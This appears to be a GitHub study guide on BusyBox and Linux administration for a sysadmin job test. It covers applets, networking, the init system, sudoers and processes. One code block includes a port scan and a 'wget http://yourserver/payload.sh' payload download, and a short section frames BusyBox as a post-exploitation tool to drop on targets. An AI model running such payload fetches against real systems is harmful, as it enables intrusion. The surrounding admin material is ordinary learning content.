## BusyBox Linux Learning Guide for System administrator job :

</p>
<p align="center">
<img src="https://github.com/ablaamim/BUSYBOX-LINUX/blob/main/imgs/sysadmin.jpg" width="500">
</p>


### 📌 Overview
BusyBox is a lightweight collection of common Unix/Linux utilities combined into a single binary.

It’s widely used in **embedded systems**, **rescue shells**, and **minimal Linux distributions** like Alpine.

For this role, **BusyBox Linux knowledge is mandatory** — meaning i must be able to perform system administration, troubleshooting, and networking tasks in a BusyBox-only environment.

---

### What is BusyBox ?

- **Definition** : 

BusyBox is a lightweight software suite that combines many common Unix utilities into a single small executable file. Often dubbed “The Swiss Army Knife of Embedded Linux,” BusyBox provides a compact implementation of numerous standard command-line tools that are essential for Unix-like operating systems.

The genius of BusyBox lies in its approach to combining functionality. Rather than having separate executables for each command like ls, cp, mv and tar, BusyBox packages all these utilities into one binary. When executed, BusyBox determines which tool to run based on how it was invoked, either through symbolic links or command-line arguments.

Typically weighing in at under 1MB, BusyBox can provide implementations of over 300 Unix utilities, including file operations, text processing tools, network utilities, system administration commands, and shell functionality. While these implementations are simplified compared to their full-featured GNU counterparts, they maintain compatibility with standard Unix command syntax for most common operations.

Official site for documentation : https://busybox.net

### History and Development :

BusyBox was created in 1996 by Bruce Perens as part of the Debian GNU/Linux installer. The original motivation was to create a rescue disk that could fit on a single floppy disk while still providing essential Unix tools.

</p>
<p align="center">
<img src="https://github.com/ablaamim/BUSYBOX-LINUX/blob/main/imgs/floppy_disk.jpg" width="500">
</p>

#### Why Hackers Should Care?

#### Why hackers care about busybox?

* Portability: BusyBox works on almost any Linux or Unix-like system.

* Minimal Footprint: Perfect for custom hacking distros, bootable USBs, or CTFs.

* Essential for Embedded Targets: Many IoT devices and routers run BusyBox by default—knowing it helps you exploit or secure them.

* Stealth: BusyBox can be statically compiled and dropped onto a target for post-exploitation, giving you a full set of tools even on stripped-down systems.

#### Where BusyBox is Used ?

| Domain | Examples / Usage |
|--- |--- |
| Embedded Systems	 |  Used in router firmware, smart TVs, automotive infotainment, and industrial control systems. Brands: Linksys, Netgear, D-Link. |
| Container Environments | Alpine Linux (used in Docker containers) uses BusyBox as the default CLI toolkit to reduce image size and resource usage. |
| IoT Devices | Incorporated into low-power Internet of Things devices to provide essential system functions with minimal resource usage. |
| Incorporated into low-power Internet of Things devices to provide essential system functions with minimal resource usage. | Used in Linux rescue disks and recovery tools to offer a full Unix environment in limited space. Continues the legacy from the Debian installer. |

#### How BusyBox Works ?

* One file contains many commands (called "applets").

* Commands are usually links to the BusyBox file.

* Can be static (works without other files) or dynamic (needs libraries).

#### File System Layout

```bash
/bin   -> Commands linked to busybox
/sbin  -> More commands
/etc   -> Config files
/proc  -> Kernel info
/tmp   -> Temporary files

```

### Setting Up a Practice Environment :

- Run a docker busybox image to Practice and experiment.

```bash
docker run -it busybox /bin/sh
Unable to find image 'busybox:latest' locally
latest: Pulling from library/busybox
90b9666d4aed: Pull complete
Digest: sha256:f9a104fddb33220ec80fc45a4e606c74aadf1ef7a3832eb0b05be9e90cd61f5f
Status: Downloaded newer image for busybox:latest
```

- Test Busybox command 'busybox' :

```bash
/ # busybox
BusyBox v1.37.0 (2024-09-26 21:31:42 UTC) multi-call binary.
BusyBox is copyrighted by many authors between 1998-2015.
Licensed under GPLv2. See source distribution for detailed
copyright notices.

Usage: busybox [function [arguments]...]
   or: busybox --list[-full]
   or: busybox --show SCRIPT
   or: busybox --install [-s] [DIR]
   or: function [arguments]...

        BusyBox is a multi-call binary that combines many common Unix
        utilities into a single executable.  Most people will create a
        link to busybox for each function they wish to use and BusyBox
        will act like whatever it was invoked as.

Currently defined functions:
        [, [[, acpid, add-shell, addgroup, adduser, adjtimex, ar, arch, arp, arping, ascii, ash, awk, base32, base64, basename, bc, beep, blkdiscard,
        blkid, blockdev, bootchartd, brctl, bunzip2, bzcat, bzip2, cal, cat, chat, chattr, chgrp, chmod, chown, chpasswd, chpst, chroot, chrt, chvt, cksum,
        clear, cmp, comm, conspy, cp, cpio, crc32, crond, crontab, cryptpw, cttyhack, cut, date, dc, dd, deallocvt, delgroup, deluser, depmod, devmem, df,
        dhcprelay, diff, dirname, dmesg, dnsd, dnsdomainname, dos2unix, dpkg, dpkg-deb, du, dumpkmap, dumpleases, echo, ed, egrep, eject, env, envdir,
        envuidgid, ether-wake, expand, expr, factor, fakeidentd, fallocate, false, fatattr, fbset, fbsplash, fdflush, fdformat, fdisk, fgconsole, fgrep,
        find, findfs, flock, fold, free, freeramdisk, fsck, fsck.minix, fsfreeze, fstrim, fsync, ftpd, ftpget, ftpput, fuser, getfattr, getopt, getty,
        grep, groups, gunzip, gzip, halt, hd, hdparm, head, hexdump, hexedit, hostid, hostname, httpd, hush, hwclock, i2cdetect, i2cdump, i2cget, i2cset,
        i2ctransfer, id, ifconfig, ifdown, ifenslave, ifplugd, ifup, inetd, init, insmod, install, ionice, iostat, ip, ipaddr, ipcalc, ipcrm, ipcs, iplink,
        ipneigh, iproute, iprule, iptunnel, kbd_mode, kill, killall, killall5, klogd, last, less, link, linux32, linux64, linuxrc, ln, loadfont, loadkmap,
        logger, login, logname, logread, losetup, lpd, lpq, lpr, ls, lsattr, lsmod, lsof, lspci, lsscsi, lsusb, lzcat, lzma, lzop, makedevs, makemime, man,
        md5sum, mdev, mesg, microcom, mim, mkdir, mkdosfs, mke2fs, mkfifo, mkfs.ext2, mkfs.minix, mkfs.vfat, mknod, mkpasswd, mkswap, mktemp, modinfo,
        modprobe, more, mount, mountpoint, mpstat, mt, mv, nameif, nanddump, nandwrite, nbd-client, nc, netstat, nice, nl, nmeter, nohup, nologin, nproc,
        nsenter, nslookup, ntpd, od, openvt, partprobe, passwd, paste, patch, pgrep, pidof, ping, ping6, pipe_progress, pivot_root, pkill, pmap,
        popmaildir, poweroff, powertop, printenv, printf, ps, pscan, pstree, pwd, pwdx, raidautorun, rdate, rdev, readahead, readlink, readprofile,
        realpath, reboot, reformime, remove-shell, renice, reset, resize, resume, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, rtcwake, run-init,
        run-parts, runlevel, runsv, runsvdir, rx, script, scriptreplay, sed, seedrng, sendmail, seq, setarch, setconsole, setfattr, setfont, setkeycodes,
        setlogcons, setpriv, setserial, setsid, setuidgid, sh, sha1sum, sha256sum, sha3sum, sha512sum, showkey, shred, shuf, slattach, sleep, smemcap,
        softlimit, sort, split, ssl_client, start-stop-daemon, stat, strings, stty, su, sulogin, sum, sv, svc, svlogd, svok, swapoff, swapon, switch_root,
        sync, sysctl, syslogd, tac, tail, tar, taskset, tc, tcpsvd, tee, telnet, telnetd, test, tftp, tftpd, time, timeout, top, touch, tr, traceroute,
        traceroute6, tree, true, truncate, ts, tsort, tty, ttysize, tunctl, ubiattach, ubidetach, ubimkvol, ubirename, ubirmvol, ubirsvol, ubiupdatevol,
        udhcpc, udhcpc6, udhcpd, udpsvd, uevent, umount, uname, unexpand, uniq, unix2dos, unlink, unlzma, unshare, unxz, unzip, uptime, users, usleep,
        uudecode, uuencode, vconfig, vi, vlock, volname, w, wall, watch, watchdog, wc, wget, which, who, whoami, whois, xargs, xxd, xz, xzcat, yes, zcat,
        zcip
```

- More commands :
```
bash# List users
busybox cat /etc/passwd

# Check network interfaces
busybox ifconfig

# Scan for open ports (if netcat is available)
busybox nc -zv 127.0.0.1 1-1024

# Download a script or tool
busybox wget http://yourserver/payload.sh

# Get a shell
busybox sh
```

#### Busybox Shell :

ash (Almquist shell — POSIX-compliant, lightweight)

💡 Tip: Some GNU command options may not exist in BusyBox.

#### System Administration with Busybox :

```bash
# Configure networking
ifconfig eth0 192.168.1.10 netmask 255.255.255.0 up
route add default gw 192.168.1.1

# Mount/umount
mount -t ext4 /dev/sda1 /mnt
umount /mnt

# Edit config files
vi /etc/network/interfaces

# View logs
dmesg
logread

```

####  Busybox Init System :

BusyBox provides a minimal init system.

Key files:

/etc/inittab — init configuration

/etc/init.d/ — service scripts

Example /etc/inittab snippet:
```bash
::sysinit:/etc/init.d/rcS
tty1::respawn:/bin/ash
::ctrlaltdel:/sbin/reboot

```

#### Networking & Security :

##### Basic static IP setup

```bash
ifconfig eth0 192.168.1.50 netmask 255.255.255.0 up
route add default gw 192.168.1.1
```

##### DHCP client:

```bash
udhcpc -i eth0
```

##### Basic firewall

```bash
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

#### Troubleshooting in BusyBox :

##### Common tools:

```bash
ps            # Check running processes
top           # Live CPU/memory usage
df -h         # Disk usage
free -m       # Memory usage
netstat -tuln # Network sockets
```

##### Remount root read/write :

```bash
mount -o remount,rw /

```

---

### Preparation for practical test :

</p>
<p align="center">
<img src="https://github.com/ablaamim/BUSYBOX-LINUX/blob/main/imgs/linux.jpg" width="500">
</p>

#### Linux Administration :

> Linux Directory Structure

 8 'must know' directories!

* / => "root" (or, just slash) is the top level of the file system hierarchy.
* /bin => Contains binaries or executable programs.
* /etc => System Configuration Files
* /home => Home Directories (of the users on the system)
* /opt => Optional or Third Party Software.
* /tmp => Temporary space, usually cleared on reboot(DONT have important stuff that you want to SAVE)
* /usr => User related programs.
* /var => Variable Data, most notable being the log files (system log files.)

#### Users and groups :

> Here's an example: When you make a new user named "Abdessa,ad " with this command:

```bash
$ sudo useradd --create-home bob
```

> Linux automatically makes a primary group also called 
"Abdessamad". Check this in the /etc/passwd file:

```bash
$ grep bob /etc/passwd
```

> This command shows Abdessamad's User ID (UID) and Group ID (GID), confirming his main group.

?  Add to groups (e.g., docker, wheel/sudo)

```bash
sudo usermod -aG sudo Abdessamad        # Debian/Ubuntu
sudo usermod -aG wheel Abdessamad       # RHEL/Rocky
```

#### Sudoers and privilleges :

```bash
# Always use visudo for syntax check
sudo visudo

# Example: allow 'deploy' to run only systemctl without password
deploy ALL=(ALL) NOPASSWD: /bin/systemctl

# Per-command specificity (safer)
deploy ALL=(root) NOPASSWD: /bin/systemctl restart nginx, /bin/systemctl status nginx
```

#### Processes and job control

> Creating and viewing processs, background vs foreground processes, killing a process, etc.

Displaying process information
ps => Display Process Status.(No arguments? Displays ps for all processes associated with current session)
Options for ps
ps

-e => Everything, all processes(NOT just limited to your session).
-f => Full format listing.
-u username => Display username's processes only. (Ex: ps -fu joehenderson)
-p pid => Display information for process with PID 'pid'.
The full listing -f contains:

UID (User ID),
PID (Process ID),
PPID (Parent Process ID),
Time , 5. Process/Command Name ... etc
One of the main reasons for running ps is to get the Process ID (PID)

NOTE:: PID != JOB NUMBER

Common ps commands:

ps -e => Display all processes.
ps -ef => Display all processes, full listing.
ps -eH => Display a process tree. (IMPORTANT)
ps -e --forest => Display a process tree. (IMPORTANT)
ps -u username => Display user's processes.
Other common commands:

pstree => Display processes in tree format.
top => Interactive process viewer. (Press 'q' to exit, '?' for help)
htop => Interactive process viewer. (Less popular, may not be available by default on the system)
The top command places the processes using most of the CPU and Memory resources at the TOP of the list. It also displays the CPU and Memory usage columns.

Killing a currently running foreground process
Press CTRL+C on the CLI while the process is running. (Pressing this kills the foreground process and return the shell prompt to the user)
Suspend a foreground process
Press CTRL+Z to suspend a foreground process.